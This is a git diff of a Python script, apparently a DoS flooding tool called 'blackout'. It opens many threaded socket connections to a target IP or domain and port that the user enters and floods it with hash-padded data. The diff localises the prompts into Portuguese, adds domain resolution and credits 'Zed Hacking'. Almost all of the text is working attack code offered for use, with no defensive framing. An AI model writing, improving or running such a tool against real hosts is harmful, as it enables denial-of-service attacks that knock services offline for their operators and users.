@@ -2,6 +2,7 @@ import socket
 import hashlib
 import threading
 import questionary
+import validators
 
 def blackout(ip, port, size, connections):
     data = hashlib.sha512(str(size).encode()).hexdigest()
@@ -28,10 +29,10 @@ def blackout(ip, port, size, connections):
         try:
             sock.send(data.encode())
             sock.send('\r\n\r\n'.encode())
-            print(f"Attacking {ip}:{port}")
+            print(f"MANDANDO CHUMBO EM {ip}:{port}")
         except socket.error as e:
             errors += 1
-            print(f"[-] Error sending data to {ip}:{port}: {e}")
+            print(f"[-] ERRO AO ENVIAR OS PACOTES{ip}:{port}: {e}")
 
     for sock in socks:
         sock.close()
@@ -39,42 +40,52 @@ def blackout(ip, port, size, connections):
     print("[*] Blackout attack finished")
     print(f"[-] {errors} Errors")
 
+    print("Créditos para o Zed Hacking pelo script de ataque!")
+
+def get_ip_or_domain(ip_or_domain):
+    if validators.ipv4(ip_or_domain) or validators.ipv6(ip_or_domain):
+        return ip_or_domain
+    try:
+        ip = socket.gethostbyname(ip_or_domain)
+        return ip
+    except socket.gaierror:
+        raise ValueError(f"Invalid IP address or domain: {ip_or_domain}")
+
 def main():
     print('''
-     _____         ____  _       _               
-    |  ___|__  _ _| __ )(_) __ _| | ___ _ __ ___ 
-    | |_ / _ \| '__|  _ \| |/ _` | |/ _ \ '__/ __|
-    |  _| (_) | |  | |_) | | (_| | |  __/ |  \__ \\
-    |_|  \___/|_|  |____/|_|\__, |_|\___|_|  |___/
-                           |___/                 
+
+8P d8P 888'Y88 888 88e
+ P d8P  888 ,'Y 888 888b
+  d8P d 888C8   888 8888D
+ d8P d8 888 ",d 888 888P
+d8P d88 888,d88 888 88"
+            
     ''')
 
-    try:
-        ip = questionary.text("Enter the target IP address:").ask()
-        port = questionary.text("Enter the target port (default: 80):").ask()
-        port = int(port) if port else 80
+    example_url = "EXEMPLO: www.example.com or 93.184.216.34"
 
-        size = questionary.text("Enter the packet size (default: 1024):").ask()
-        size = int(size) if size else 1024
+    ip_or_domain = questionary.text("Coloque o site ou ip alvo ({example_url}):").ask()
+    ip = get_ip_or_domain(ip_or_domain)
 
-        connections = questionary.text("Enter the number of connections (default: 1000):").ask()
-        connections = int(connections) if connections else 1000
+    port = questionary.text("Coloque a porta(default: 80):").ask()
+    port = int(port) if port else 80
 
-        num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading
+    size = questionary.text("Coloque o tamanho dos pacotes enviados(default: 1024):").ask()
+    size = int(size) if size else 1024
 
-        threads = []
-        for _ in range(num_threads):
-            thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads))
-            threads.append(thread)
-            thread.start()
+    connections = questionary.text("coloque Número de conexões  (default: 1000):").ask()
+    connections = int(connections) if connections else 1000
 
-        for thread in threads:
-            thread.join()
-    except ValueError:
-        print("[-] Invalid input. Please enter valid numeric values.")
-    except KeyboardInterrupt:
-        print("\n[-] Blackout attack interrupted.")
+    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading
+
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
     main()
-    
